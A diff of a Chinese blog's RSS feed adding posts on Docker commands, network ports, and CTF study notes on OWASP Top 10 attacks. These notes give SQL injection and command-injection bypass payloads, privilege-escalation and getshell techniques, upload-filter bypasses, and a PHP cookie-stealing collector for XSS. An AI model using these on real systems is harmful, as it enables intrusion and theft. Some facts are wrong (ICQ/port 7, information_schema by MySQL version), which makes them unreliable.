@@ -5,8 +5,8 @@
         <link>https://alazymechnaic.github.io</link>
         <description></description>
         <language>zh-CN</language>
-        <pubDate>Mon, 04 Mar 2024 14:10:57 +0800</pubDate>
-        <lastBuildDate>Mon, 04 Mar 2024 14:10:57 +0800</lastBuildDate>
+        <pubDate>Mon, 04 Mar 2024 14:50:45 +0800</pubDate>
+        <lastBuildDate>Mon, 04 Mar 2024 14:50:45 +0800</lastBuildDate>
         <category>paper</category>
         <category>fuzz</category>
         <category>arm</category>
@@ -26,6 +26,743 @@
         <category>dataflow</category>
         <category>pwn</category>
         <category>java</category>
+        <category>web</category>
+        <category>exploit</category>
+        <category>network</category>
+        <item>
+            <guid isPermalink="true">https://alazymechnaic.github.io/2024/03/04/docker-ming-ling-ji-chu/</guid>
+            <title>docker命令基础</title>
+            <link>https://alazymechnaic.github.io/2024/03/04/docker-ming-ling-ji-chu/</link>
+            <pubDate>Mon, 04 Mar 2024 14:50:45 +0800</pubDate>
+            <description><![CDATA[ &lt;p&gt;创建容器：&lt;/p&gt;
+&lt;p&gt;docker images 查看有哪些镜像&lt;/p&gt;
+&lt;p&gt;docker search nginx 查看对应的镜像信息&lt;/p&gt;
+&lt;p&gt;docker pull nginx:1.20.1&lt;/p&gt;
+&lt;p&gt;docker run -d –name myNginx -p 80:80 -d nginx（或者这里写ID） 第一个端口是本机端口，第二个端口是目标docker的端口&lt;/p&gt;
+&lt;p&gt;docker ps -a 查看所有的容器&lt;/p&gt;
+&lt;p&gt;上传文件：&lt;/p&gt;
+&lt;p&gt;docker cp /home/temp.txt redis:/data/&lt;/p&gt;
+&lt;p&gt;下载文件：&lt;/p&gt;
+&lt;p&gt;docker cp redis:/data/temp.txt /home/&lt;/p&gt;
+&lt;p&gt;进入docker的bash环境：&lt;/p&gt;
+&lt;p&gt;docker exec-it redis /bin/bash&lt;/p&gt;
+&lt;p&gt;不进入环境，只是执行命令：&lt;/p&gt;
+&lt;p&gt;docker exec-it redis /bin/bash 要执行的脚本或者指令&lt;/p&gt;
+&lt;p&gt;docker镜像导出，tar镜像包可以拷贝到其他机器docker环境中加载&lt;/p&gt;
+&lt;p&gt;docker save hello -o hello.tar&lt;/p&gt;
+&lt;p&gt;docker镜像加载&lt;/p&gt;
+&lt;p&gt;docker load -i hello.tar&lt;/p&gt;
+&lt;p&gt;使用docker-compose build 自动化编译环境&lt;/p&gt;
+&lt;p&gt;使用docker-compose up -d 启动整个环境&lt;/p&gt;
+ ]]></description>
+        </item>
+        <item>
+            <guid isPermalink="true">https://alazymechnaic.github.io/2024/03/04/ji-suan-ji-wang-luo-ji-chu/</guid>
+            <title>计算机网络基础</title>
+            <link>https://alazymechnaic.github.io/2024/03/04/ji-suan-ji-wang-luo-ji-chu/</link>
+            <category>network</category>
+            <pubDate>Mon, 04 Mar 2024 14:48:04 +0800</pubDate>
+            <description><![CDATA[ &lt;h3 id=&#34;TCP链接建立过程&#34;&gt;&lt;a href=&#34;#TCP链接建立过程&#34; class=&#34;headerlink&#34; title=&#34;TCP链接建立过程&#34;&gt;&lt;/a&gt;TCP链接建立过程&lt;/h3&gt;&lt;h3 id=&#34;HTTP链接建立过程&#34;&gt;&lt;a href=&#34;#HTTP链接建立过程&#34; class=&#34;headerlink&#34; title=&#34;HTTP链接建立过程&#34;&gt;&lt;/a&gt;HTTP链接建立过程&lt;/h3&gt;&lt;h3 id=&#34;常见网络协议及端口&#34;&gt;&lt;a href=&#34;#常见网络协议及端口&#34; class=&#34;headerlink&#34; title=&#34;常见网络协议及端口&#34;&gt;&lt;/a&gt;常见网络协议及端口&lt;/h3&gt;&lt;p&gt;1.HTTP (Hyper Text Transfer Protocol) 端口号：80&lt;/p&gt;
+&lt;p&gt;2.HTTPS (Secure Hyper Text Transfer Protocol) 端口号：443&lt;/p&gt;
+&lt;p&gt;3.FTP (File Transfer Protocol) 端口号：21&lt;/p&gt;
+&lt;p&gt;4.SMTP (Simple Mail Transfer Protocol) 端口号：25&lt;/p&gt;
+&lt;p&gt;5.POP3 (Post Office Protocol version 3) 端口号：110&lt;/p&gt;
+&lt;p&gt;6.IMAP (Internet Message Access Protocol) 端口号：143&lt;/p&gt;
+&lt;p&gt;7.DNS (Domain Name System) 端口号：53&lt;/p&gt;
+&lt;p&gt;8.DHCP (Dynamic Host Configuration Protocol) 端口号：67/68&lt;/p&gt;
+&lt;p&gt;9.Telnet (Terminal Emulation) 端口号：23&lt;/p&gt;
+&lt;p&gt;10.SSH (Secure Shell) 端口号：22&lt;/p&gt;
+&lt;p&gt;11.NTP (Network Time Protocol) 端口号：123&lt;/p&gt;
+&lt;p&gt;12.SNMP (Simple Network Management Protocol) 端口号：161/162&lt;/p&gt;
+&lt;p&gt;13.RDP (Remote Desktop Protocol) 端口号：3389&lt;/p&gt;
+&lt;p&gt;14.SIP (Session Initiation Protocol) 端口号：5060/5061&lt;/p&gt;
+&lt;p&gt;15.ICQ (Internet Control Message Protocol) 端口号：7&lt;/p&gt;
+&lt;p&gt;16.IRC (Internet Relay Chat) 端口号：194&lt;/p&gt;
+&lt;p&gt;17.BitTorrent 端口号：6881-6889&lt;/p&gt;
+ ]]></description>
+        </item>
+        <item>
+            <guid isPermalink="true">https://alazymechnaic.github.io/2024/03/04/owasp-top10-hui-zong/</guid>
+            <title>OWASP top10 汇总</title>
+            <link>https://alazymechnaic.github.io/2024/03/04/owasp-top10-hui-zong/</link>
+            <category>web</category>
+            <category>exploit</category>
+            <pubDate>Mon, 04 Mar 2024 14:45:25 +0800</pubDate>
+            <description><![CDATA[ &lt;h1 id=&#34;CTF-Web-OWASP-Top10&#34;&gt;&lt;a href=&#34;#CTF-Web-OWASP-Top10&#34; class=&#34;headerlink&#34; title=&#34;CTF Web OWASP Top10&#34;&gt;&lt;/a&gt;CTF Web OWASP Top10&lt;/h1&gt;&lt;h1 id=&#34;注入漏洞&#34;&gt;&lt;a href=&#34;#注入漏洞&#34; class=&#34;headerlink&#34; title=&#34;注入漏洞&#34;&gt;&lt;/a&gt;注入漏洞&lt;/h1&gt;&lt;ol&gt;
+&lt;li&gt;&lt;p&gt;SQL注入&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;字符型注入&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;&lt;strong&gt;1. information_schema.tables where table_schema=database() 2. information_schema.columns where table_name=’查询到的表名’ # 查看列名&lt;/strong&gt;&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;&lt;p&gt;数字型注入&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;宽字节注入&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;产生原理：在web中对于单引号会进行转译，在前面加上反斜杠进行转译操作，但是0x5C和前面的0xbf会组成一个字符，从而造成后面的0x27逃逸。0x5cbf是一个中文GBK编码里的一个汉字&lt;/li&gt;
+&lt;li&gt;一些函数&lt;a href=&#34;http://www.baidu.com/link?url=9cRbUwRIrAuYAB6IXVQCP3RAy6b7IEVDAtWJ30s_SZ3mrkZvhI9rcB-Jmg0SflArh_S6yOMxBxbzIIjd3IOQ6dVDC5v5tpWhgDGAlrypqIW&#34;&gt;addslashes&lt;/a&gt;函数会将特殊字符加个反斜杠转译&lt;/li&gt;
+&lt;li&gt;解决方法：同一数据库，web应用，操作系统所使用的数据集。对数据进行正确的转译&lt;/li&gt;
+&lt;/ol&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;延时注入&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;页面并不会给出任何的回显，利用sleep函数和字符串处理函数进行正误的反馈&lt;/li&gt;
+&lt;/ol&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;报错注入&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;&lt;p&gt;常用函数&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;&lt;p&gt;XPATH&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;floor&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;向下取整函数，当其余count和order by进行连用时会出现报错&lt;/li&gt;
+&lt;/ol&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;updatexml&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;第二个参数必须是一个有效的XPATH，因此可以成select语句，&lt;/li&gt;
+&lt;li&gt;&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;&lt;img src=&#34;D:/Users/harry/Documents/GitHub/HustCTFer/CTF_Web/CTF_Web_OWASP_top10.assets/image-20221030143612631.png&#34; alt=&#34;image-20221030143612631&#34;&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;extractvalue&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;与updatexml的原理类似，都是用于xpath路径错误所导致的&lt;/li&gt;
+&lt;/ol&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;geometrycollection&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;multipoint&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;polygon&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;exp&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;布尔注入&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;页面虽然不能返回查询的结果，但是对于输入 布尔值 0 和 1 的反应是不同的，那我们就可以利用这个输入布尔值的注入点来注入我们的条件语句，从而能根据页面的返回情况推测出我们输入的语句是否正确(&lt;strong&gt;输入语句的真假直接影响整条查询语句最后查询的结果的真假&lt;/strong&gt;)&lt;/li&gt;
+&lt;li&gt;&lt;img src=&#34;D:/Users/harry/Documents/GitHub/HustCTFer/CTF_Web/CTF_Web_OWASP_top10.assets/image-20221030144059058.png&#34; alt=&#34;image-20221030144059058&#34;&gt;&lt;/li&gt;
+&lt;/ol&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;堆叠注入&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;原因是网站使用了mysql_multi_query()函数进行SQL的查询，导致一次进行了多次查询&lt;/li&gt;
+&lt;li&gt;可以在直接在后面加上分号开始执行另一条语句&lt;/li&gt;
+&lt;/ol&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;二次注入&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;例如用户注册时对于用的输入内容进行严格的转译，防止mysql执行含有特殊字符及字符串的sql语句，但是当在注册时将内容插入到数据库的内容并不存在转义符，因此可以尝试再次使用例如修改密码等操作，使其取出数据库的payload拼接到新的sql语句中执行&lt;/li&gt;
+&lt;li&gt;解决方法: 保证数据流安全，对于外部提交的数据始终保持一个审慎的状态，即便是从数据库中查出的内容也进行严格的过滤&lt;/li&gt;
+&lt;/ol&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;绕过方法：&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;&lt;p&gt;空格的绕过方法&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;编码后的TAB符&lt;/li&gt;
+&lt;li&gt;圆括号&lt;/li&gt;
+&lt;li&gt;闭合注释/**/&lt;/li&gt;
+&lt;/ol&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;等于号的绕过&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;sth in sth&lt;/li&gt;
+&lt;li&gt;like&lt;/li&gt;
+&lt;/ol&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;select&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;&lt;p&gt;使用handler进行绕过&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;&lt;img src=&#34;D:/Users/harry/Documents/GitHub/HustCTFer/CTF_Web/CTF_Web_OWASP_top10.assets/image-20221030144118632.png&#34; alt=&#34;image-20221030144118632&#34;&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;利用show进行代替：show columns from ‘xxx’;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;一般字符串绕过方法：&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;&lt;p&gt;大小写绕过&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;利用prepare将字符串中的关键词拆开：&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;&lt;img src=&#34;https://github.com/alazymechnaic/HustCTFer/blob/main/CTF%20Web/CTF_Web_OWASP_top10.assets/image-20221030144136360.png&#34; alt=&#34;image-20221030144136360&#34;&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;使用reverse函数将字符串进行绕过，或者使用char函数将字符写作ascii码进行绕过&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;使用CHAR函数，SELECT FROM Users WHERE username = &lt;strong&gt;CHAR&lt;/strong&gt;(101, 97, 105, 116)或者char(101)+char(97)+char(105)+char(116)&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;替换逗号&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;使用join函数&lt;/li&gt;
+&lt;li&gt;&lt;img src=&#34;D:/Users/harry/Documents/GitHub/HustCTFer/CTF_Web/CTF_Web_OWASP_top10.assets/image-20221030144147705.png&#34; alt=&#34;image-20221030144147705&#34;&gt;&lt;/li&gt;
+&lt;/ol&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;大于小于号绕过&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;使用greatest函数，将取出的字符和对应的字符进行比较&lt;/li&gt;
+&lt;li&gt;用于布尔注入或者延时注入时的二分查找法&lt;/li&gt;
+&lt;/ol&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;sleep函数绕过&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;使用反复执行md5函数的操作延长执行时间&lt;/li&gt;
+&lt;li&gt;&lt;img src=&#34;D:/Users/harry/Documents/GitHub/HustCTFer/CTF_Web/CTF_Web_OWASP_top10.assets/image-20221030144158798.png&#34; alt=&#34;image-20221030144158798&#34;&gt;&lt;/li&gt;
+&lt;/ol&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;mysql的基本操作&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;插入一条数据：INSERT INTO tb_courses (course_id,course_name,course_grade,course_info) VALUES(1,’Network’,3,’Computer Network’);&lt;/li&gt;
+&lt;li&gt;删除一条数据：DELETE FROM tb_courses WHERE course_id=4;&lt;/li&gt;
+&lt;li&gt;修改数据 UPDATE table_name SET field1=new-value1, field2=new-value2 where id=xxx；&lt;/li&gt;
+&lt;/ol&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;SQL注入读写文件 1.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://alazymechnaic.oss-cn-hangzhou.aliyuncs.com/blog-page/202403041429028.png&#34; alt=&#34;image-20221030144208544&#34;&gt;&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;&lt;p&gt;1’ union select ,1,(Select load_file(‘c:/phpstudy/www/1.txt’)),3%23&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;修改sql的日志位置，但是需要提供绝对路径 1.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://alazymechnaic.oss-cn-hangzhou.aliyuncs.com/blog-page/202403041429891.png&#34; alt=&#34;image-20221030144218177&#34;&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;SQL注入提权&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;mof提权&lt;ol&gt;
+&lt;li&gt;mof文件是windows系统下的一个托管文件，其作用是每隔五秒就会去监控进程创建和死亡，其本身使用的是管理员权限来完成该任务，mysql中上传mof文件到一个可读可写的目录中，而后使用sql语句替换对应的内容，&lt;/li&gt;
+&lt;li&gt;Select load_file(“上传文件的路径”) into dumpfile “配置文件所在路径” ，mof文件中存在一些提权vbs脚本，一般是添加管理员账户等行为。&lt;/li&gt;
+&lt;/ol&gt;
+&lt;/li&gt;
+&lt;li&gt;udf提权&lt;ol&gt;
+&lt;li&gt;要求secure-file-priv参数设置为空，设置为null禁止mysql导入和导出&lt;/li&gt;
+&lt;li&gt;对目录有写出权限&lt;/li&gt;
+&lt;li&gt;编写恶意的udf文件替换udf.dll文件&lt;/li&gt;
+&lt;/ol&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;SQL注入getshell&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;mysql中使用system pwd方式可以执行系统命令，也可以使用cmd_shell&lt;/li&gt;
+&lt;li&gt;session包含方式getshell&lt;/li&gt;
+&lt;li&gt;&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;&lt;img src=&#34;https://alazymechnaic.oss-cn-hangzhou.aliyuncs.com/blog-page/202403041429924.png&#34; alt=&#34;image-20221030144228649&#34;&gt;&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;慢查询日志getshell&lt;/li&gt;
+&lt;li&gt;&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;&lt;img src=&#34;https://alazymechnaic.oss-cn-hangzhou.aliyuncs.com/blog-page/202403041429941.png&#34; alt=&#34;image-20221030144241107&#34;&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h2 id=&#34;防御手段：可以采用预编译的方式进行。&#34;&gt;&lt;a href=&#34;#防御手段：可以采用预编译的方式进行。&#34; class=&#34;headerlink&#34; title=&#34;防御手段：可以采用预编译的方式进行。&#34;&gt;&lt;/a&gt;防御手段：可以采用预编译的方式进行。&lt;/h2&gt;&lt;ol&gt;
+&lt;li&gt;&lt;p&gt;过滤函数：&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;命令注入&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;&lt;p&gt;php执行系统命令的函数：&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;&lt;p&gt;system，eval，assert，call_user_func，shell_exec，passthru，proc_open()&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;读文件的命令more，less，head查看前几行的内容，tac从最后一行开始读内容,od以二进制的方式读取内容，file -f从报错中可以看到具体内容&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;绕过方法：&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;&lt;p&gt;字符串绕过 ip2long函数更改字符串的类型为long类型，但同样在传入后可以执行&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;使用URL编码进行注入&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;分号拼接，&amp;amp;&amp;amp;符拼接，将前一个内容的输入为空，和后面管道符拼接后继续或者使用||当前一个命令执行不成功时执行后面一个命令&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;命令嵌套 echo “result ${uname -a}”&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;${IFS}用于进行空格的替换，cat&amp;lt;flag.txt用于代替空格，php环境下可以用tab（编码后即%09）&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;关键词绕过&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;Windows下可以使用大小写&lt;/li&gt;
+&lt;li&gt;&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;&lt;img src=&#34;https://alazymechnaic.oss-cn-hangzhou.aliyuncs.com/blog-page/202403041429970.png&#34; alt=&#34;image-20221030144252391&#34;&gt;&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;base64的编码方式：&lt;/li&gt;
+&lt;li&gt;&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;&lt;img src=&#34;https://alazymechnaic.oss-cn-hangzhou.aliyuncs.com/blog-page/202403041429034.png&#34; alt=&#34;image-20221030144259834&#34;&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;修复方法&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;强过滤：&lt;ol&gt;
+&lt;li&gt;stripslashes() 剔除反斜杠&lt;/li&gt;
+&lt;li&gt;addslashes() 给特殊字符增加反斜杠&lt;/li&gt;
+&lt;li&gt;mysql_real_escape_string() 转译在mysql中使用到的特殊字符&lt;/li&gt;
+&lt;/ol&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;MYSQL 5.0以上与以下注入的区别：&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;mysql5.0以上没有information_schema这个表，因此只能暴力跑表名&lt;/li&gt;
+&lt;li&gt;5.0以下是单用户操作，5.0以上是多用户操作&lt;/li&gt;
+&lt;/ol&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;SQL注入能做什么：万能密码，写入webshell，执行系统指令&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;文件读取函数：file_get_contents(),highlight_file(),fopen(),readfile(),fread(),fgets(),show_source()&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h1 id=&#34;中间件漏洞&#34;&gt;&lt;a href=&#34;#中间件漏洞&#34; class=&#34;headerlink&#34; title=&#34;中间件漏洞&#34;&gt;&lt;/a&gt;中间件漏洞&lt;/h1&gt;&lt;h1 id=&#34;文件上传漏洞&#34;&gt;&lt;a href=&#34;#文件上传漏洞&#34; class=&#34;headerlink&#34; title=&#34;文件上传漏洞&#34;&gt;&lt;/a&gt;文件上传漏洞&lt;/h1&gt;&lt;p&gt;绕过方式：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;前端JS验证：&lt;ul&gt;
+&lt;li&gt;禁用JS&lt;/li&gt;
+&lt;li&gt;抓包该文件内容/文件名&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;MIME验证&lt;ul&gt;
+&lt;li&gt;修改Content-Type中的内容为image/jepg&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;服务端验证后缀：&lt;ul&gt;
+&lt;li&gt;php更改为畸形后缀，例如phtml，php，php3等内容&lt;/li&gt;
+&lt;li&gt;当目标主机是windows时可以尝试采用大小写绕过的方式&lt;/li&gt;
+&lt;li&gt;::$DATA备用数据流的绕过方式&lt;/li&gt;
+&lt;li&gt;上传.htaccess文件更改当前文件夹下的解析规则，将jpg文件按照php文件的格式进行解析&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;%00截断；（php5.3以下才可以使用，且要求上传的文件名就是最终存储的文件名，或者最终存储的文件名是可控的，问题出现在存储时，上传时需要手动解码以下00）&lt;/li&gt;
+&lt;li&gt;配合文件包含漏洞使用，构造图片马，copy a.jpg + b.php 1.jpg&lt;/li&gt;
+&lt;li&gt;中间件的解析漏洞（IIS6.0的未知后缀会一直向前解析；条件竞争&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;防御方法：白名单检查；随机化存储路径；上传的目录限制执行权限；网站服务器和文件服务器二者分离；限制文件的大小&lt;/p&gt;
+&lt;h1 id=&#34;XSS漏洞&#34;&gt;&lt;a href=&#34;#XSS漏洞&#34; class=&#34;headerlink&#34; title=&#34;XSS漏洞&#34;&gt;&lt;/a&gt;XSS漏洞&lt;/h1&gt;&lt;h2 id=&#34;反射型XSS&#34;&gt;&lt;a href=&#34;#反射型XSS&#34; class=&#34;headerlink&#34; title=&#34;反射型XSS&#34;&gt;&lt;/a&gt;反射型XSS&lt;/h2&gt;&lt;hr&gt;
+&lt;p&gt;反射型XSS，当传入的用户信息被当做JS代码执行。反射型XSS仅在GET方法时，引诱用户点击链接，是有危害性的。&lt;/p&gt;
+&lt;figure class=&#34;highlight js&#34;&gt;&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs js&#34;&gt;&lt;span class=&#34;hljs-title function_&#34;&gt;alert&lt;/span&gt;(&lt;span class=&#34;hljs-variable language_&#34;&gt;document&lt;/span&gt;.&lt;span class=&#34;hljs-property&#34;&gt;cookie&lt;/span&gt;) # 弹出用户cookie&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs php&#34;&gt;&lt;span class=&#34;hljs-comment&#34;&gt;# 在服务器上搭建接收cookie的页面&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-meta&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$cookie&lt;/span&gt; = &lt;span class=&#34;hljs-variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&#39;cookie&#39;&lt;/span&gt;];&lt;br&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$ip&lt;/span&gt; = &lt;span class=&#34;hljs-title function_ invoke__&#34;&gt;getenv&lt;/span&gt; (&lt;span class=&#34;hljs-string&#34;&gt;&#39;REMOTE_ADDR&#39;&lt;/span&gt;);&lt;br&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$time&lt;/span&gt; = &lt;span class=&#34;hljs-title function_ invoke__&#34;&gt;date&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&#39;Y-m-d g:i:s&#39;&lt;/span&gt;);&lt;br&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$fp&lt;/span&gt; = &lt;span class=&#34;hljs-title function_ invoke__&#34;&gt;fopen&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&#34;cookie.txt&#34;&lt;/span&gt;,&lt;span class=&#34;hljs-string&#34;&gt;&#34;a&#34;&lt;/span&gt;);&lt;br&gt;&lt;span class=&#34;hljs-title function_ invoke__&#34;&gt;fwrite&lt;/span&gt;(&lt;span class=&#34;hljs-variable&#34;&gt;$fp&lt;/span&gt;,&lt;span class=&#34;hljs-string&#34;&gt;&#34;IP: &#34;&lt;/span&gt;.&lt;span class=&#34;hljs-variable&#34;&gt;$ip&lt;/span&gt;.&lt;span class=&#34;hljs-string&#34;&gt;&#34;Date: &#34;&lt;/span&gt;.&lt;span class=&#34;hljs-variable&#34;&gt;$time&lt;/span&gt;.&lt;span class=&#34;hljs-string&#34;&gt;&#34; Cookie:&#34;&lt;/span&gt;.&lt;span class=&#34;hljs-variable&#34;&gt;$cookie&lt;/span&gt;.&lt;span class=&#34;hljs-string&#34;&gt;&#34;\n&#34;&lt;/span&gt;);&lt;br&gt;&lt;span class=&#34;hljs-title function_ invoke__&#34;&gt;fclose&lt;/span&gt;(&lt;span class=&#34;hljs-variable&#34;&gt;$fp&lt;/span&gt;);&lt;br&gt;&lt;span class=&#34;hljs-meta&#34;&gt;?&amp;gt;&lt;/span&gt;   &lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;p&gt;构造JS代码&lt;/p&gt;
